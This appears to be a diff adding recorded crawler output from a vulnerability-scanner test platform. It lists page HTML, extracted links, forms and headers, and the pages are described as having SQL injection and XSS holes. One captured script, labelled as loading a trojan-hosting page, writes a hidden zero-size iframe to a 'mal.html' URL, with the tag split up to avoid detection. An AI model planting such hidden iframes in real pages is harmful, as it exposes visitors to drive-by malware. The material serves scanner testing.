@@ -1,0 +1,113 @@
+{
+    u'content': {
+        u'elasped': 773,
+        u'ok': 1,
+        u'response': {
+            u'body': u'<html><head><metahttp-equiv="content-type"content="text/html; charset=utf-8">\n<title>AISec\u6f0f\u6d1e\u626b\u63cf\u5668\u6d4b\u8bd5\u5e73\u53f0</title>\n\n</head><bodybgcolor="#fffff"><br><center>AISec\u6f0f\u6d1e\u626b\u63cf\u5668\u6d4b\u8bd5\u5e73\u53f0</center>\n\n<style>\n.demo{
+                background-color: #eeeeee;margin: 30px;padding: 20px;
+            }\n</style>\n\n\n\n\n\n<divclass="demo">\n\u4ee5\u4e0b\u662f\u666e\u901a\u7684HTML\u94fe\u63a5"html_link.php?id=1"\u3002\u5982\u679c\u626b\u63cf\u5668\u4f7f\u7528\u4e86HTMLParser\uff0c\u5c31\u53ef\u4ee5\u83b7\u5f97\u8be5\u94fe\u63a5\uff0c\u5e76\u80fd\u68c0\u6d4b\u51fa\u8be5\u94fe\u63a5\u5b58\u5728SQL\u6ce8\u5165: <br>\n<ahref="html_link.php?id=2">html_link.php?id=1</a>\n</div>\n\n\n\n\n\n\n<!--useJavascripttocreatelinks-->\n<divclass="demo"id="jsCode">\n\u4ee5\u4e0b\u662fJavascript\u751f\u6210\u7684\u94fe\u63a5"js_link.php?id=1&amp;msg=abc"\u3002\u5982\u679c\u626b\u63cf\u5668\u652f\u6301Javascript\uff0c\u5c31\u53ef\u4ee5\u83b7\u5f97\u8be5\u94fe\u63a5\uff0c\u5e76\u80fd\u68c0\u6d4b\u51fa\u8be5\u94fe\u63a5\u5b58\u5728SQL\u6ce8\u5165\u3001XSS\u6f0f\u6d1e: (<ahref="#"onclick="alert(document.getElementById(\'jsCode\').innerHTML);return false;">\u67e5\u770b\u4ee3\u7801</a>)<br>\n\n<aid="hi"href="js_link.php?id=2&amp;msg=abc">js_link.php?id=1&amp;msg=abc</a>\n<script>\nurl="js_link.php"+"?id=2&msg=abc";\nhi.href=url;\n</script>\n</div>\n\n\n\n\n\n\n\n\n\n<!--sendform-->\n<divclass="demo"id="formCode">\n\u4ee5\u4e0b\u662f\u4e00\u4e2aPost\u7c7b\u578b\u7684\u8868\u5355\uff0c\u63d0\u4ea4\u540e\u751f\u6210"post_link.php?id=1&amp;msg=1"\u3002\u5982\u679c\u626b\u63cf\u5668\u80fd\u591f"\u81ea\u52a8\u5206\u6790\u8868\u5355"\uff0c\u5c31\u53ef\u4ee5\u83b7\u5f97\u8be5\u94fe\u63a5\uff0c\u5e76\u80fd\u68c0\u6d4b\u51fa\u8be5\u94fe\u63a5\u5b58\u5728SQL\u6ce8\u5165\u3001XSS\u6f0f\u6d1e\uff1a(<ahref="#"onclick="alert(document.getElementById(\'formCode\').innerHTML);return false;">\u67e5\u770b\u4ee3\u7801</a>)<br>\n\n<formmethod="post"name="form1"enctype="multipart/form-data"action="post_link.php">\n<script>\ndocument.write(\'<inputtype="text"name="i\'+\'d"size="30"value=1><br>\');\ndocument.write(\'<inputtype="text"name="m\'+\'sg"size="30"value="abc">\');\n</script><inputtype="text"name="id"size="30"value="1"><br><inputtype="text"name="msg"size="30"value="abc">\n<inputtype="submit"value="\u63d0\u4ea4"name="B1">\n</form>\n</div>\n\n\n\n\n\n\n\n\n<divclass="demo"id="clickCode">\n\u7528\u6237\u70b9\u51fb\u4ee5\u4e0b\u6309\u94ae\u540e\uff0c\u4f1a\u751f\u6210\u94fe\u63a5"click_link.php?id=1"\u3002\u5982\u679c\u626b\u63cf\u5668\u652f\u6301"\u81ea\u52a8\u4ea4\u4e92"\uff0c\u5c31\u53ef\u4ee5\u83b7\u5f97\u8be5\u94fe\u63a5\uff0c\u5e76\u80fd\u68c0\u6d4b\u51fa\u8be5\u94fe\u63a5\u5b58\u5728SQL\u6ce8\u5165\uff1a(<ahref="#"onclick="alert(document.getElementById(\'clickCode\').innerHTML);return false;">\u67e5\u770b\u4ee3\u7801</a>)\n<br>\n\n<divid="abc">-</div>\n<inputtype="button"id="1"onclick="abc.innerHTML =\'&lt;a href=click_link.php\'+\'?id=2&gt;click_link.php?id=2&lt;/a&gt;\'"value="\u70b9\u51fb\u540e\u751f\u6210\u94fe\u63a5(click_link.php?id=1)">\n</div>\n\n\n\n\n\n\n\n\n\n<!--sendajax-->\n<divclass="demo"id="ajaxCode">\n\u4ee5\u4e0b\u4ee3\u7801\u4f1a\u53d1\u9001\u4e00\u4e2aAjax\u8bf7\u6c42\uff0c\u94fe\u63a5\u4e3a\u201cajax_link.php?id=1&amp;t=\u201d\u3002\u5982\u679c\u626b\u63cf\u5668\u652f\u6301Ajax\uff0c\u5c31\u53ef\u4ee5\u83b7\u5f97\u8be5\u94fe\u63a5\uff0c\u5e76\u80fd\u68c0\u6d4b\u51fa\u8be5\u94fe\u63a5\u5b58\u5728SQL\u6ce8\u5165\uff1a(<ahref="#"onclick="alert(document.getElementById(\'ajaxCode\').innerHTML);return false;">\u67e5\u770b\u4ee3\u7801</a>)\n<br>\n\n<script>\nif(window.ActiveXObject)ajax=newActiveXObject("Microsoft.XMLHTTP");\nelseajax=newXMLHttpRequest();\najax.open(\'post\',
+            "ajax_link.php?id=1&t="+Math.random(),
+            false);\najax.send();\ndocument.write("ajax.ResponseText length:"+ajax.responseText.length);\n</script>ajax.ResponseTextlength: 265\n</div>\n\n\n\n\n\n\n<!--executeajax-->\n<divclass="demo"id="ifCode">\n\u5f53\u672c\u7ad9\u7684\u57df\u540d\u662fgov.cn\u65f6\uff0c\u4ee5\u4e0b\u4ee3\u7801\u751f\u6210\u94fe\u63a5\u4e3a\u201cif_link.php?id=2\u201d\u3002\u5982\u679c\u626b\u63cf\u5668\u652f\u6301\uff08\u9ad8\u542f\u53d1\uff09\u8def\u5f84\u6267\u884c\uff0c\u5c31\u53ef\u4ee5\u83b7\u5f97\u8be5\u94fe\u63a5\uff0c\u5e76\u80fd\u68c0\u6d4b\u51fa\u8be5\u94fe\u63a5\u5b58\u5728SQL\u6ce8\u5165\uff1a(<ahref="#"onclick="alert(document.getElementById(\'ifCode\').innerHTML);return false;">\u67e5\u770b\u4ee3\u7801</a>)\n<br>\n\n<script>\ndocument.cookie="u=guest";\nif(document.location.host=="gov.cn"){
+                \n\tdocument.write("<a href"+"=\'if_link.php?id=2\'>if_link.php?id=2</a>");\n\tdocument.location="/notExitst/";\n
+            }\n</script>\n</div>\n\n\n\n<!--\u52a0\u8f7d\u6765\u81ea\u7b2c\u4e09\u65b9\u7684\u6302\u9a6c\u7f51\u9875-->\n<script>\nif(document.location.href.indexOf("gov.cn")>0){
+                \n\tdocument.write("<ifr");\n\tdocument.write("ame src=\'http://info.aisec.cn/");\n\tdocument.write("demo/aisec/mal.html?id=1&from=html\' width=0 height=0></iframe>");\n
+            }\n</script>\n<!--\u548c\u8c10\u6302\u94fe,
+            \u5404\u6302\u5404\u94fe-->\n\n\n\n\n<divclass="demo"style="background-color:#e3e3e3">\n<ahref="login.php">Web\u767b\u5f55\u9875\u9762\u53e3\u4ee4\u7834\u89e3</a>\n<ahref="other/"></a>\n<ahref="cookie_link.php?id=1"></a>\n\n&nbsp;&nbsp;&nbsp;&nbsp;\n\n<ahref="http://demo.aisec.cn">\u67e5\u770b\u66f4\u591a\u6d4b\u8bd5\u5e73\u53f0</a>\n</div>\n\n\n<br><br><br>\n\n</body></html>',
+            u'contentType': u'text/html',
+            u'details': {
+                u'forms': [
+                    {
+                        u'data': u'B1=%E6%8F%90%E4%BA%A4&id=1&msg=abc',
+                        u'dataType': {
+                            u'B1': u'submit',
+                            u'id': u'text',
+                            u'msg': u'text'
+                        },
+                        u'method': u'post',
+                        u'url': u'http: //demo.aisec.cn/demo/aisec/post_link.php'
+                    }
+                ],
+                u'jsLinkFeedback': True,
+                u'links': [
+                    {
+                        u'text': u'html_link.php?id=1',
+                        u'url': u'http: //demo.aisec.cn/demo/aisec/html_link.php?id=2'
+                    },
+                    {
+                        u'text': u'\u67e5\u770b\u4ee3\u7801',
+                        u'url': u'http: //demo.aisec.cn/demo/aisec/#'
+                    },
+                    {
+                        u'text': u'js_link.php?id=1&msg=abc',
+                        u'url': u'http: //demo.aisec.cn/demo/aisec/js_link.php?id=2&msg=abc'
+                    },
+                    {
+                        u'text': u'\u67e5\u770b\u4ee3\u7801',
+                        u'url': u'http: //demo.aisec.cn/demo/aisec/#'
+                    },
+                    {
+                        u'text': u'\u67e5\u770b\u4ee3\u7801',
+                        u'url': u'http: //demo.aisec.cn/demo/aisec/#'
+                    },
+                    {
+                        u'text': u'\u67e5\u770b\u4ee3\u7801',
+                        u'url': u'http: //demo.aisec.cn/demo/aisec/#'
+                    },
+                    {
+                        u'text': u'\u67e5\u770b\u4ee3\u7801',
+                        u'url': u'http: //demo.aisec.cn/demo/aisec/#'
+                    },
+                    {
+                        u'text': u'Web\u767b\u5f55\u9875\u9762\u53e3\u4ee4\u7834\u89e3',
+                        u'url': u'http: //demo.aisec.cn/demo/aisec/login.php'
+                    },
+                    {
+                        u'text': u'',
+                        u'url': u'http: //demo.aisec.cn/demo/aisec/other/'
+                    },
+                    {
+                        u'text': u'',
+                        u'url': u'http: //demo.aisec.cn/demo/aisec/cookie_link.php?id=1'
+                    },
+                    {
+                        u'text': u'\u67e5\u770b\u66f4\u591a\u6d4b\u8bd5\u5e73\u53f0',
+                        u'url': u'http: //demo.aisec.cn/'
+                    }
+                ]
+            },
+            u'headers': {
+                u'Connection': [
+                    u'keep-alive'
+                ],
+                u'Content-Type': [
+                    u'text/html'
+                ],
+                u'Date': [
+                    u'Thu,
+                    22Dec201608: 00: 21GMT'
+                ],
+                u'Server': [
+                    u'WAF3.0'
+                ],
+                u'X-Powered-By': [
+                    u'PHP/5.4.16'
+                ]
+            },
+            u'status': 200,
+            u'url': u'http: //demo.aisec.cn/demo/aisec/'
+        }
+    },
+    u'cookies': None,
+    u'headers': {
+
+    },
+    u'js_script_result': None,
+    u'orig_url': u'http: //demo.aisec.cn/demo/aisec/',
+    u'save': None,
+    u'status_code': 200,
+    u'time': 0.777,
+    u'url': u'http: //demo.aisec.cn/demo/aisec/'
+}
+
+{u'cookies': None, u'url': u'http://127.0.0.1:14887/js', u'orig_url': u'http://127.0.0.1:14887/js', u'time': 0.482, u'content': u'{"response":{"headers":{"Content-Type":["text/html; charset=utf-8"],"Content-Length":["190"],"Access-Control-Allow-Origin":["*"],"Access-Control-Allow-Credentials":["true"],"Server":["Werkzeug/0.11.11 Python/2.7.12"],"Date":["Wed, 21 Dec 2016 03:09:22 GMT"]},"contentType":"text/html; charset=utf-8","status":200,"url":"http://127.0.0.1:14887/js","body":"<html><head></head><body><div class=\\"demo\\" id=\\"jsCode\\">\\n<a id=\\"l1\\" href=\\"js_link1.php?id=1&amp;msg=abc\\">js_link1</a>\\n<a id=\\"l2\\" href=\\"js_link2.php?id=2&amp;msg=\u54c7\\">js_link2</a>\\n<script>\\nl1.href = \\"js_link1.php\\"+\\"?id=1&msg=abc\\";\\nl2.href = \\"js_link2.php\\"+\\"?id=2&msg=\u54c7\\";\\n</script>\\n</div>\\n</body></html>","details":{"links":[{"text":"js_link1","url":"http://127.0.0.1:14887/js_link1.php?id=1&msg=abc"},{"text":"js_link2","url":"http://127.0.0.1:14887/js_link2.php?id=2&msg=%E5%93%87"}],"forms":[],"jsLinkFeedback":true}},"elasped":414,"ok":1}', u'headers': {}, u'status_code': 200, u'js_script_result': None, u'save': None}
+{u'cookies': None, u'url': u'http://127.0.0.1:14887/form', u'orig_url': u'http://127.0.0.1:14887/form', u'time': 1.259, u'content': u'{"response":{"headers":{"Content-Type":["text/html; charset=utf-8"],"Content-Length":["356"],"Access-Control-Allow-Origin":["*"],"Access-Control-Allow-Credentials":["true"],"Server":["Werkzeug/0.11.11 Python/2.7.12"],"Date":["Wed, 21 Dec 2016 03:05:31 GMT"]},"contentType":"text/html; charset=utf-8","status":200,"url":"http://127.0.0.1:14887/form","body":"<html><head></head><body><div class=\\"demo\\" id=\\"formCode\\">\\n<form method=\\"post\\" name=\\"form1\\" enctype=\\"multipart/form-data\\" action=\\"post_link.php\\">\\n<script>\\ndocument.write(\'<input type=\\"text\\" name=\\"i\'+\'d\\" size=\\"30\\" value=1><br>\');\\ndocument.write(\'<input type=\\"text\\" name=\\"m\'+\'sg\\" size=\\"30\\" value=\\"abc\\">\');\\n</script><input type=\\"text\\" name=\\"id\\" size=\\"30\\" value=\\"1\\"><br><input type=\\"text\\" name=\\"msg\\" size=\\"30\\" value=\\"abc\\">\\n<input type=\\"submit\\" value=\\"\u63d0\u4ea4\\" name=\\"B1\\">\\n</form>\\n</div>\\n    </body></html>","details":{"links":[],"forms":[{"data":"B1=%E6%8F%90%E4%BA%A4&id=1&msg=abc","dataType":{"B1":"submit","id":"text","msg":"text"},"method":"post","url":"http://127.0.0.1:14887/post_link.php"}],"jsLinkFeedback":true}},"elasped":1197,"ok":1}', u'headers': {}., u'status_code': 200, u'js_script_result': None, u'save': None}
